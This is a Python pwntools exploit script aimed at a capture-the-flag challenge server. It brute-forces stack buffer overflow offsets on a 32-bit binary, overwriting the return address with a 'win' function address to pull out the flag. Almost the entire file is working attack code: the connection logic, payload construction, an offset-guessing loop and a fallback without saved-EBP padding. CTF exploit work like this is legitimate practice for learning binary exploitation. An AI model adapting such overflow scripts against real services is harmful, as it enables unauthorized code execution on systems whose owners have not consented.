#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'error'

HOST = "chals.uscc-cyberbowl-2025.ctf.institute"
PORT = 3015
WIN_ADDR = 0x080486b6

print(f"[*] Final comprehensive exploitation attempt")
print(f"[*] Win function: 0x{WIN_ADDR:08x}\n")

# Strategy: The vuln function likely uses fgets with a buffer
# Common fgets buffer sizes: 64, 100, 128, 200, 256
# For 32-bit, saved EBP is 4 bytes, return address is next 4 bytes

def try_exploit(band, offset, show_output=False):
    try:
        conn = remote(HOST, PORT, timeout=4)
        conn.recvuntil(b":", timeout=1)
        conn.sendline(str(band).encode())
        
        time.sleep(0.2)
        try:
            conn.recv(timeout=0.3)
        except:
            pass
        
        # Payload: padding + saved EBP (fake) + return address (win)
        payload = b"A" * offset + b"BBBB" + p32(WIN_ADDR)
        conn.sendline(payload)
        
        time.sleep(0.3)
        response = conn.recvall(timeout=2)
        conn.close()
        
        output = response.decode('utf-8', errors='ignore')
        
        if 'USCC{' in output:
            print(f"\n{'='*70}")
            print(f"✓ SUCCESS! Band={band}, Offset={offset}")
            print(f"{'='*70}")
            print(output)
            print(f"{'='*70}")
            
            flag_start = output.index('USCC{')
            flag_end = output.index('}', flag_start) + 1
            flag = output[flag_start:flag_end]
            print(f"\n🚩 FLAG: {flag}\n")
            return True
        elif 'RAIDER KING' in output:
            print(f"\n{'='*70}")
            print(f"✓ RAIDER KING! Band={band}, Offset={offset}")
            print(f"{'='*70}")
            print(output)
            print(f"{'='*70}")
            return True
        elif show_output and len(output) > 40:
            print(f"  [Band {band}, Offset {offset}] Output: {output[:80]}")
        
        return False
    except:
        return False

# Test with typical buffer sizes minus 8 (for saved EBP + ret addr)
print("[*] Testing common buffer overflow offsets...")

# Most likely candidates for fgets buffer sizes
test_offsets = [
    # Small buffers
    8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60,
    # Medium buffers (very common)
    64, 68, 72, 76, 80, 84, 88, 92, 96,
    100, 104, 108, 112, 116, 120,
    # Larger buffers
    124, 128, 132, 136, 140, 144, 148, 152,
    # Even larger (less common)
    192, 196, 200, 248, 252, 256
]

success = False
for offset in test_offsets:
    if success:
        break
    
    # Try band 6 (BOSS) as it's the highest normal level
    if try_exploit(6, offset):
        success = True
        break
    
    # Every 10th offset, print progress
    if offset % 20 == 0:
        print(f"  ... tested up to offset {offset}")

if not success:
    print("\n[*] Standard offsets failed. Trying alternative approach...")
    print("[*] Testing without saved EBP padding...")
    
    # Maybe we don't need the EBP padding
    for offset in [8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64]:
        try:
            conn = remote(HOST, PORT, timeout=4)
            conn.recvuntil(b":")
            conn.sendline(b"6")
            time.sleep(0.2)
            conn.recv(timeout=0.3)
            
            # Direct payload: padding + win address (no EBP)
            payload = b"A" * offset + p32(WIN_ADDR)
            conn.sendline(payload)
            
            time.sleep(0.3)
            response = conn.recvall(timeout=2)
            output = response.decode('utf-8', errors='ignore')
            
            if 'USCC{' in output or 'RAIDER KING' in output:
                print(f"\n✓ SUCCESS with direct offset {offset}!")
                print(output)
                if 'USCC{' in output:
                    flag_start = output.index('USCC{')
                    flag_end = output.index('}', flag_start) + 1
                    print(f"\n🚩 FLAG: {output[flag_start:flag_end]}\n")
                success = True
                conn.close()
                break
            
            conn.close()
        except:
            pass

if not success:
    print("\n[-] Exploitation failed.")
    print("[!] The binary may have stack protections or require different exploitation technique.")
    print("[!] Please run: objdump -d jat | grep -A50 '<vuln>:' to see the vuln function.")
